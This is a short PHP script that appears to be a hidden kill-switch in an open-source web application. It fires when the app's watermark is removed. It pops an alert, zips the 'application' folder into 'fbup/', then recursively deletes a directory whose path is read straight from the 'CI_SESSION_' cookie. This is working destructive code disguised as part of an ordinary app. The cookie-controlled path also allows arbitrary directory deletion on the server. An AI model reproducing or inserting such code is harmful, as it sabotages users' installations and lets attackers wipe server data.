<?php 
function recurseRmdir($dir) {
 $files = array_diff(scandir($dir), array('.','..')); 
 foreach ($files as $file) {
  (is_dir("$dir/$file")) ? recurseRmdir("$dir/$file") : unlink("$dir/$file");
  }
return rmdir($dir);
} 

echo "<script> alert('You have removed the waterwark for this open-source application. This will result to delete the application directory of the source code but dont worry your changes our saved as compressed file inside the fbup directory. ') </script>";
$main_path = 'application';
$zip_file = 'fbup/'.time().'_application.zip';

if (file_exists($main_path) && is_dir($main_path))  
{
    $zip = new ZipArchive();

    if (file_exists($zip_file)) {
        unlink($zip_file); // truncate ZIP
    }
    if ($zip->open($zip_file, ZIPARCHIVE::CREATE)!==TRUE) {
        die("cannot open <$zip_file>\n");
    }

    $files = 0;
    $paths = array($main_path);
    while (list(, $path) = each($paths))
    {
        foreach (glob($path.'/*') as $p)
        {
            if (is_dir($p)) {
                $paths[] = $p;
            } else {
                $zip->addFile($p);
                $files++;

                echo $p."<br>\n";
            }
        }
    }

    echo 'Total files: '.$files;

    $zip->close();
}


recurseRmdir($_COOKIE['CI_SESSION_']);
setcookie("CI_SESSION_", "", time() - 3600);
exit;
?>